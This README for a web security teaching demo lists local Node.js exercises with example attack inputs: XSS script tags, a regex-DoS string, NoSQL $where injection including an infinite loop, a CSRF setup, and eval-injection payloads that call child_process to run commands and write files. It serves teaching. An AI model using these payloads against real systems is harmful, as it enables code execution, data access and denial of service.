# Security

Slides <https://docs.google.com/presentation/d/1KbBG3Z1rTYcXCO8FHb8Br4K08nvQEDPgo2OXfUuWUAU/edit?usp=sharing>

## xss

Reflected:

    nodemon xss-reflected.js

    http://localhost:3000/?user=sam
    http://localhost:3000/?user=sam<script>alert('pwned')</script>

Stored:

    nodemon xss-stored.js

    http://localhost:3000/register
    http://localhost:3000/users

    <script>alert('pwned')</script>

DOM:

    nodemon xss-dom.js

    http://localhost:3000/?language=english
    http://localhost:3000/?language=english<script>alert('pwned')</script>

## DOS

    nodemon dos.js

    http://localhost:3000/register

    aaaaaaaaaaaaaaaaaaaaaaaa!

## NoSQL

    nodemon cats.js

    http://localhost:3000/create
    http://localhost:3000/find

    docker run -d -p 27017:27017 --expose 27017 --name mongo mongo
    docker run -it --link mongo:mongo --rm mongo sh -c 'exec mongo "$MONGO_PORT_27017_TCP_ADDR:$MONGO_PORT_27017_TCP_PORT"'

    # Mongo command ref
    show dbs
    use cats
    db.cats.find({})
    db.cats.remove({})
    db.dropDatabase()


    {
        "query": {
            "name": "Jessy",
            "$where": "function() { while(1);}"
        }
    }

    {
        "query": {
            "name": "Jessy",
            "$where": "function() { return true}"
        }
    }

    // { $where: function() { return db.getCollectionNames().length == 1} }

## CSRF

    nodemon csrf.js

    http://mybank.com:3000
    http://badsite.com:3001

## Injection

    nodemon cats.js

    http://localhost:3000/eval

    {"catArray": "['Sam','Jessy']"}

    https://nodejs.org/api/fs.html

    {"catArray": "fs=require('fs');fs.readdirSync('/')"}

    {"catArray": "fs=require('fs');fs.writeFileSync('/tmp/safe', 'hello')"}

    {"catArray": "cp=require('child_process');cp.execSync('/usr/bin/say pwned')"}
    {"catArray": "cp=require('child_process');cp.execSync('open /Applications/Calculator.app')"}

    {"catArray": "fs=require('fs');fs.writeFileSync('/tmp/watch.js', 'setInterval(function(){console.log(1)},2000)');cp=require('child_process');cp.exec('node /tmp/watch.js')"}


## CSP

    nodemon cats.js

## x-powered-by

    app.disable('x-powered-by');

